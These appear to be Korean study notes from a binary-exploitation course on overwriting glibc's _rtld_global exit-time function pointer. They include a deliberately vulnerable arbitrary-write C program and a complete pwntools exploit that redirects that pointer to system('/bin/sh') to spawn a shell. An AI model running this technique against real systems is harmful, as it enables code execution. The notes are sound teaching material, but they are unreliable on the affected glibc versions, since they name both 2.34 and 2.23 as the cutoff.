# _rtld_global
리눅스 프로그램을 실행하면 프로그램에 명시된 코드의  결과값이 우리에게 출력되는데 프로그램이 실해오디어 프로세스로 등록될 때에는 프로그램에 명시된 코드 뿐만 아니라 프로그램에서 쓰이는 변수를 관리하기 휘한 영역을 할당하는 등의 다양한 코드가 로더에 의해 실행됨
개발자는 이러한 과정을 이해할 필요 없으나 프로그램을 분석하고 공격하는 입장에서는 프로세스를 로드하고 종료하는 과정을 이해하고 있는 것이 유리함

프로세스가 등록되거나 종료될때 쓰이는 변수와 영역들을 알고 있다면 이를 이용한 새로운 공격 기법을 개발 할 수 있음 실제로 glibc 2.34 이전 버전에서는 프로그램이 종료하는 과정에서 호출되는 함수 포인터가 존재해 Hook overwrite와 마찬가지로 해당 함수 포인터를 악의적인 주소로 조작해서 실행흐름을 변조하는 공격이 가능함
해당 공격 기법을 알아보기에 앞서 라이브러리의 코드를 분석하면서 어떤 방식으로 프로세스를 종료하는지 알아보도록 함

// Name: rtld.c
// Compile: gcc -o rtld rtld.c
int main() {
  return 0;
}

## __GL_exit
앞서 컴파일 한 예제코드는 별다른 코드를 실행하지 않고 프로그램을 종료함 프로그램을 종료할때에는 우리가 모르는 많은 코드들이 내부적으로 실행되는데 이를 디버깅을 통해 구경해보면
gdb-peda$ disas main
Dump of assembler code for function main:
   0x00000000000005fa <+0>:	push   rbp
   0x00000000000005fb <+1>:	mov    rbp,rsp
   0x00000000000005fe <+4>:	mov    eax,0x0
   0x0000000000000603 <+9>:	pop    rbp
   0x0000000000000604 <+10>:	ret
   gdb-peda$ b *main+10
Breakpoint 1 at 0x604
gdb-peda$ r 
gdb-peda$ si
...
=> 0x7ffff7a03bf7 <__libc_start_main+231>:	mov    edi,eax
   0x7ffff7a03bf9 <__libc_start_main+233>:	call   0x7ffff7a25240 <__GI_exit>
...

먼저 위 코드와 같이 main 함수 내 리턴하는 명령어에 브레이크 포인트를 설정하고 step info를 통해 다음 코드를 확인해보면 디버깅 결과를 살펴보면 main함수 내에서 리턴 명령어를 실행하면 스택 최상단에 있는 __libc_start_main+231 코드가 실행되고 내부에서 __GI_exit함수를 호출하는 것을 볼 수 있음
__GI_exit함수 내부에서 또 다른 함수를 호출하는지 확인하기 위해 다시 한번 step into  명령어를 실행하면
__GI_exit 함수 내부의 모습으로 갈수 있고 또 다른 __run_eixt_handlers함수가 등장함 해당 함수는 코드의 크기가 크므로 라이브러리 코드를 통해 분석해보면
=> 0x7ffff7a25240 <__GI_exit>:	lea    rsi,[rip+0x3a84d1]        # 0x7ffff7dcd718 <__exit_funcs>
   0x7ffff7a25247 <__GI_exit+7>:	sub    rsp,0x8
   0x7ffff7a2524b <__GI_exit+11>:	mov    ecx,0x1
   0x7ffff7a25250 <__GI_exit+16>:	mov    edx,0x1
   0x7ffff7a25255 <__GI_exit+21>:	call   0x7ffff7a24ff0 <__run_exit_handlers>

## __run_exit_handlers
   void
attribute_hidden
__run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
{
	  const struct exit_function *const f = &cur->fns[--cur->idx];
	  switch (f->flavor)
	    {
	      void (*atfct) (void);
	      void (*onfct) (int status, void *arg);
	      void (*cxafct) (void *arg, int status);
	    case ef_free:
	    case ef_us:
	      break;
	    case ef_on:
	      onfct = f->func.on.fn;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (onfct);
#endif
	      onfct (status, f->func.on.arg);
	      break;
	    case ef_at:
	      atfct = f->func.at;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (atfct);
#endif
	      atfct ();
	      break;
	    case ef_cxa:
	      cxafct = f->func.cxa.fn;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (cxafct);
#endif
	      cxafct (f->func.cxa.arg, status);
	      break;
	    }
	}
위코드는 __run_exit_handlers 함수의 코드로 exit_function 구조체의 멤버 변수에 따른 함수 포인터를 호출함 해당 구조체의 모습은 아래 코드와 같으며 예제와 같이 리턴 명령어를 실행해 프로그램을 종료한다면 _dl_fini 함수를 호출함
struct exit_function
{
/* `flavour' should be of type of the `enum' above but since we need
   this element in an atomic operation we have to use `long int'.  */
long int flavor;
union
  {
void (*at) (void);
struct
  {
    void (*fn) (int status, void *arg);
    void *arg;
  } on;
struct
{
    void (*fn) (void *arg, int status);
    void *arg;
    void *dso_handle;
  } cxa;
  } func;
};

## _dl_fini
아래는 로더에 존재하는 _dl_fini 함수 코드의 일부임 코드를 살펴보면 _dl_load_lock을 인자로 __rtld_lock_lock_recursive함수를 호출하는 것을 볼 수 있음 매크로를 확인해보면 해당 함수는 dl_rtld_lock_recursive라는 함수 포인터임을 알 수 있음
해당 함수 포인터는 _rtld_global 구조체의 멤버 변수임 해당 구조체는 매우 방대하기 떄문에 함수 포인터와 전달되는 인자인  dl_load_lock만을 살펴보면
# define __rtld_lock_lock_recursive(NAME) \
  GL(dl_rtld_lock_recursive) (&(NAME).mutex)
  
void
_dl_fini (void)
{
#ifdef SHARED
  int do_audit = 0;
 again:
#endif
  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock));

## _rtld_global
아래 코드는 gdb에서 _rtld_global 구조체를 출력하는 모습인데 구조체 내 _dl_rtld_lock_recursive 함수 포인터에는 rtld_lock_default_lock_recursive 함수 주소를 저장하고 있음 구조체의 함수 포인터가 저장된 영역은 읽기및 쓰기 권한이 존재하기 때문에 덮어 쓰는 것 또한 가능함
gdb-peda$ p _rtld_global
_dl_load_lock = {
    mutex = {
      __data = {
        __lock = 0x0, 
        __count = 0x0, 
        __owner = 0x0, 
        __nusers = 0x0, 
        __kind = 0x1, 
        __spins = 0x0, 
        __elision = 0x0, 
        __list = {
          __prev = 0x0, 
          __next = 0x0
        }
      }, 
      __size = '\000' <repeats 16 times>, "\001", '\000' <repeats 22 times>, 
      __align = 0x0
    }
  },
  _dl_rtld_lock_recursive = 0x7ffff7dd60e0 <rtld_lock_default_lock_recursive>, 
  ...
}
gdb-peda$ p &_rtld_global._dl_rtld_lock_recursive
$2 = (void (**)(void *)) 0x7ffff7ffdf60 <_rtld_global+3840>
gdb-peda$ vmmap 0x7ffff7ffdf60
Start              End                Perm	Name
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so

## _rtld_global 초기화
아래코드는 프로세스를 로드할 때 호출되는 dl_main코드의 일부로 _rtld_global 구조체의 dl_rtld_lock_recursive함수 포인터가 초기화되는 것을 확인 가능
static void
dl_main (const ElfW(Phdr) *phdr,
	 ElfW(Word) phnum,
	 ElfW(Addr) *user_entry,
	 ElfW(auxv_t) *auxv)
{
  GL(dl_init_static_tls) = &_dl_nothread_init_static_tls;
#if defined SHARED && defined _LIBC_REENTRANT \
    && defined __rtld_lock_default_lock_recursive
  GL(dl_rtld_lock_recursive) = rtld_lock_default_lock_recursive;
  GL(dl_rtld_unlock_recursive) = rtld_lock_default_unlock_recursive;

  리턴 명령어는 실제로 로더에서 다양한 함수를 호출해 프로그램을 종료하는 것을 알 수 있음 호출하는 함수 중 _rtld_global 구조체 내 함수 포인터는 프로세스가 실해오디면서 초기화 되며 이는 읽고 쓸수 있는 영역에 위치하기 때문에 임의 주소에 값을 쓸수 있는 취약점이 있다면 이를 덮어서 실행 흐름을 조작할수 있음


  ### overwrite_rtld_global
  프로그램에서 리턴 명령어를 수행하면 라이브러리와 로더에서 다양한 함수를 호출하며넛 정상 종료됨 이과정에서 릭고 쓸수 있는 영역에 존재하는 함수 포인터를 호출하기 때문에 임의 주소 쓰기 취약점이 있다면 해당 포인터를 덮어써서 프로그램의 실행 흐름을 조작할 수 있음 glibc 2.34 이전에서 가능
  // Name: ow_rtld.c
// Compile: gcc -o ow_rtld ow_rtld.c

#include <stdio.h>
#include <stdlib.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  long addr;
  long data;
  int idx;

  init();

  printf("stdout: %p\n", stdout);
  while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("addr: ");
        scanf("%ld", &addr);
        printf("data: ");
        scanf("%ld", &data);
        *(long long *)addr = data;
        break;
      default:
      	return 0;
    }
  }
  return 0;
}

#### 코드 분석
##### 보호 기법
$ pwn checksec ow_rtld
[*] 'ow_rtld'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

##### 코드 분석
예제에서는 stdout 라이브러리 주소를 출력하고 입력한 addr주소에 data를 삽입하는 임의 주소 쓰기 취약점이 존재함 
예제를 보면 모든 보호기법이 적용되어 있어 GOT overwrite가 불가능함

##### 익스 설계
1. 라이브러리 및 로더 베이스 주소 계산
예제에서 제공한 stdout주소를 통해 라이브러리의 베이스 주소를 구하고 /lib64/ld-linux-x86-64.so.2(또는 ld-2.27.so)가 맵핑된 로더의 베이스 주소를 알아냄 라이브러리와 로더가 맵핑된 주소의 간격은 일정하기 때문에 디버깅을 통해 간격을 알아내고 오프셋을 계산하여 알아낼수 있음

2. _rtld_global 구조체 계산
로더의 베이스 주소를 알아낸다면 rtld_global 구조체의 심볼 주소를 더해 해당 구조체의 주소를 알아낼수 있음 해당 구조체 주소를 구했다면 멤버 변수인 _dl_load_lock과 _dl_rtld_lock_recursive 함수 포인터의 주소를 구함

3. _rtld_global 구조체 조작
프로그램을 종료하는 과정에서 _rtld_global 구조체의 _dl_load_lock 을 인자로 _dl_rtld_lock_recursive함수 포인터를 호출함 따라서 _dl_load_lock에 binsh또는 sh 문자열을 삽입하고 _dl_rtld_lock_recursive를 system 함수로 덮어쓰면 셸을 획득 가능

###### ld.so 변경
첨부파일로 제공된 ld.so파일과 실습 환경에 배치된 ld.so파일이 다른 경우 _rtld_global의 오프셋이 다르기 때문에 익스을 정확하게 수행하지 못 함 따라서 patchelf 도구를 사용하여 바이너리가 지정한 ld.so를 사용하도록 패치해야 함

ld.so 비교
패치에 앞서 첨부파일로 제공된 ld.so(ld-2.27.so 파일) 와 실습 환경에 배치된 ld.so(ld-linux-x86-64.so.2 파일)가 어떻게 다른지 비교해보면
$ md5sum ld-2.27.so
ecedcc8d1cac4f344f2e2d0564ff67ab  ld-2.27.so
$ md5sum /lib64/ld-linux-x86-64.so.2
bd1331eea9e034eb3d661990e25037b7  /lib64/ld-linux-x86-64.so.2
$ readelf -s ld-2.27.so | grep " _rtld_global@"
    25: 0000000000228060  3960 OBJECT  GLOBAL DEFAULT   21 _rtld_global@@GLIBC_PRIVAT
$ readelf -s /lib64/ld-linux-x86-64.so.2 | grep " _rtld_global@"
    25: 000000000022a060  3960 OBJECT  GLOBAL DEFAULT   21 _rtld_global@@GLIBC_PRIVATE

파일의 해기값도 다르고 _rtld_global의 오프셋도 -x228060와 0x22a060로 서로 다름
이 경우 로컬과 원격 서버의 _rtld_global 오프셋이 다르므로 로컬의 ld_so를 사용해서 원격 익스를 진행하면 실패함

!patchelf를 활용한 패치
patchelf를 사용하면 바이너리가 특정 ld.so를 사용하도록 패치할 수 이음 patchelf는 apt install patchelf로 설치 가능 
dockerfile로 환경을 구축한 경우 이미 설치가 되어 있음
다음 명여렁로 바이너리가 제공된 ld2-27.so를 사용하도록 패치
$ patchelf --set-interpreter ./ld-2.27.so ./ow_rtld
#### 패치 확인
바이너리가 지정한 ld.so를 사용해서 잘 실행되는지 다음과 같이 gdb의 vmmap명령어를 사용해서 확인 가능
$ gdb ./ow_rtld
pwndbg> entry
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555400000     0x555555401000 r-xp     1000      0 /home/dreamhack/ow_rtld
    0x555555600000     0x555555601000 r--p     1000      0 /home/dreamhack/ow_rtld
    0x555555601000     0x555555602000 rw-p     1000   1000 /home/dreamhack/ow_rtld
    0x555555602000     0x555555603000 rw-p     1000   3000 /home/dreamhack/ow_rtld
    0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000      0 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7bcb000     0x7ffff7dcb000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcb000     0x7ffff7dcf000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcf000     0x7ffff7dd1000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     4000      0 [anon_7ffff7dd1]
    0x7ffff7dd5000     0x7ffff7dfc000 r-xp    27000      0 /home/dreamhack/ld-2.27.so
    0x7ffff7fee000     0x7ffff7ff0000 rw-p     2000      0 [anon_7ffff7fee]
    0x7ffff7ff6000     0x7ffff7ffa000 r--p     4000      0 [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000      0 [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  27000 /home/dreamhack/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  28000 /home/dreamhack/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]

결과를 보면 우리가 지정한 home dreamhack ld-2.27.o파일이 잘 매핑되어 있음

라이브러리 및 로더 베이스 주소 계산
예제에서 주어진 stdout 라이브러리 주소를 이용해 라이브러리와 로더의 베이스 주소를 알아내보면 라이브러리의 베이스 주소는 IO_2_1_stdout 심볼 주소를 빼 쉽게 알아낼수 있음 로더의 주소는 디버깅을 통해 라이브러리 베이스 주소와 뺄셈하여 간격 차이를 알아내면 쉽게 구할 수 있음

다음은 디버깅을 통해 두 베이스 주소의 간격 차이를 알아낸 모습임
vmmap명령어로 라이브러리인 libc-2.27.so가 매핑된 주소와 로더인 ld-2.27.so가 매핑된 베이스 주소를 알아낼수 있으며 각각 0x7ffff79e4000와 0x7ffff7dd5000임
$ export LD_PRELOAD=$(realpath ./libc-2.27.so)
$ gdb ow_rtld
pwndbg> entry
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555400000     0x555555401000 r-xp     1000      0 /home/dreamhack/ow_rtld
    0x555555600000     0x555555601000 r--p     1000      0 /home/dreamhack/ow_rtld
    0x555555601000     0x555555602000 rw-p     1000   1000 /home/dreamhack/ow_rtld
    0x555555602000     0x555555603000 rw-p     1000   3000 /home/dreamhack/ow_rtld
    0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000      0 /home/dreamhack/libc-2.27.so
    0x7ffff7bcb000     0x7ffff7dcb000 ---p   200000 1e7000 /home/dreamhack/libc-2.27.so
    0x7ffff7dcb000     0x7ffff7dcf000 r--p     4000 1e7000 /home/dreamhack/libc-2.27.so
    0x7ffff7dcf000     0x7ffff7dd1000 rw-p     2000 1eb000 /home/dreamhack/libc-2.27.so
    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     4000      0 [anon_7ffff7dd1]
    0x7ffff7dd5000     0x7ffff7dfc000 r-xp    27000      0 /home/dreamhack/ld-2.27.so
    0x7ffff7ff4000     0x7ffff7ff6000 rw-p     2000      0 [anon_7ffff7ff4]
    0x7ffff7ff6000     0x7ffff7ffa000 r--p     4000      0 [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000      0 [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  27000 /home/dreamhack/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  28000 /home/dreamhack/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
pwndbg> p/x 0x7ffff7dd5000 - 0x7ffff79e4000
$1 = 0x3f1000

두 주소의 간격은 0x3f1000임을 알수 있으며 이를 통해 라이브러리와 로더의 베이스 주소를 알아내는 익스코드를 같이 작성 할 수 있음
#!/usr/bin/env python3
# Name: ow_rtld.py
from pwn import *
p = process('./ow_rtld')
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')
p.recvuntil(b': ')
stdout = int(p.recvuntil(b'\n'), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3f1000
print('libc_base..', hex(libc_base))
print('ld_base..', hex(ld_base))
p.interactive()

#### _rtld_global 주소 계산
라이브러리의 베이스 주소와 로더의 베이스 주소를 알아냈다면 _rtld_global구조체의 주소와 덮어쓸 멤버 변수의 주소를 구해보면
디버깅 심볼 다운로드
_rtld_global 구조체 내 멤버 변수의 오프셋을 알아내려면 구조체 이름 뿐만 아니라 그 안의 멤버 변수 정보 까지 담고 ㅣㅆ는 디버깅 심볼이 필요함 먼저 첨부 파일로 주어진 libc 및 ld의 glibc버전을 알아내고 해당 버전과 상응하는ㄴ 디버깅 심볼을 다운로드함
먼저 glibc 버전을 알아내야 하는데 첨부 파일로 주어진 libc-2.27.so를  실행해보면 다음과 같은 결과를 얻을수 있음
$ ./libc-2.27.so
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 7.3.0.
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
실행 결과 첫 번째 라인에 2.27-3ubuntu1가 해당하는 glibc의 상세 버전임 해당 버전의 libc6-dbg패키지를 다운로드 하면 되는ㄴ데 libc6-dbg 2.27-3ubuntu1를 구글링해서 찾아내거나 다음의 명령어로 다운로드 가능
$ wget http://launchpadlibrarian.net/365856914/libc6-dbg_2.27-3ubuntu1_amd64.deb

다운로드한 .deb파일을 대상으로 다음의 명령어를 사용해서 패키지에 포함된 파일을 추출하여 현재 디렉토리에 저장함
$ dpkg -x libc6-dbg_2.27-3ubuntu1_amd64.deb ./

#### _rtld_global의 멤버 변수 오프셋 얻기
압축을 해제하면 usr/lib/debug/lib/x86_64-linux-gnu/ld-2.27.so파일이 있음
해당 파일을 다음과 같이 gdb로 열어서 _rtld_global구조체의 멤버 변수 _dl_load_lock과 멤버 변수 _dl_rtld_lock_recursive의 오프셋을 얻을수 있음
$ gdb usr/lib/debug/lib/x86_64-linux-gnu/ld-2.27.so
pwndbg> p &_rtld_global._dl_load_lock
$1 = (__rtld_lock_recursive_t *) 0x228968 <_rtld_local+2312>
pwndbg> p &_rtld_global._dl_rtld_lock_recursive
$2 = (void (**)(void *)) 0x228f60 <_rtld_local+3840>
따라서 멤버 변수 _dl_load_lock와 _dl_rtld_lock_recursive의 오프셋은 각각 _rtld_global 구조체로부터 2312과 3840 뒤에 위치함을 확인 가능

#### 주소 계산
앞서 구한 id가 매핑된 베이스 주소에 _rtld_global의 오프셋을 더하면 _rtld_global의 주소를 계산 할 수 있음
계산하여 얻은 _rtld_global의 주소에 2312과  3840을 더하면 각각 멤버 변수 _dl_load_lock과 _dl_rtld_lock_recursive의 주소를 계산 가능
#!/usr/bin/env python3
# Name: ow_rtld.py
from pwn import *
p = process('./ow_rtld')
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')
p.recvuntil(b': ')
stdout = int(p.recvuntil(b'\n'), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3f1000
print('libc_base..', hex(libc_base))
print('ld_base..', hex(ld_base))
rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lock = rtld_global + 2312
dl_rtld_lock_recursive = rtld_global + 3840
print('rtld_global..', hex(rtld_global))
print('dl_load_lock..', hex(dl_load_lock))
print('dl_rtld_lock_recursive..', hex(dl_rtld_lock_recursive))
p.interactive()

#### _rtld_global 구조체 조작
덮어쓸 주소를 모두 알아냈으면 _dl_rtld_lock_recursive를 라이브러리 함수 system으로 덮어쓰고 dl_load_lock주소에 sh 또는 /bin/sh문자열을  쓰면 셀 가능

아래 코드는 앞서 설명한 것과 같이 멤버 변수를 덮어쓴 익스코드임 각 멤버 변수를 덮어쓰고 1번이 아닌 다른 값을 입력하면 프로그램을 종료하면서 덮었ㄴ 함수 포인터가 호출돼 셸을 획득 가능

#!/usr/bin/env python3
# Name: ow_rtld.py
from pwn import *
p = process('./ow_rtld')
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')
p.recvuntil(b': ')
stdout = int(p.recvuntil(b'\n'), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3f1000
print('libc_base..', hex(libc_base))
print('ld_base..', hex(ld_base))
rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lock = rtld_global + 2312
dl_rtld_lock_recursive = rtld_global + 3840
print('rtld_global..', hex(rtld_global))
print('dl_load_lock..', hex(dl_load_lock))
print('dl_rtld_lock_recursive..', hex(dl_rtld_lock_recursive))
system = libc_base + libc.symbols['system']
print('system..', hex(system))
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_load_lock).encode())
p.sendlineafter(b'data: ', str(u64('/bin/sh\x00')).encode())
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_rtld_lock_recursive).encode())
p.sendlineafter(b'data: ', str(system).encode())
p.sendlineafter(b'> ', b'2')
p.interactive()

glibc2.34이전 버전에서 프로그램이 종료하며 호출하는 함수 포인터를 조작해 셸을 획득할수 있으며 exit 함수 또는 리턴 명령어가 실행될 때에는 실제로 로더 내부에서 다양한 코드를 실행하는데 만약 라이브러리 또는 로더의 주소 중 하나의 주소만 알 수 있으면 두 주소 모두 알아낼수 있으며 이를 통해 _rtld_global 구조체를 조작하고 프로그램 종료시에 임의 코드를 실행 할 수 있음 실습에서는 system 함수를 호출했지만 상황에 따라 앞서 배운 원가젯 주소를 삽입하는 방법 또한 존재함
해당 공격기법은 glibc2.23이전 버전에서만 가능하며 이 강의에서 배운 함수 포인터 외에도 glibc에는 많은 함수 포인터가 존재함 그러한 함수 포인터들이 공격에 이용도리수 있음
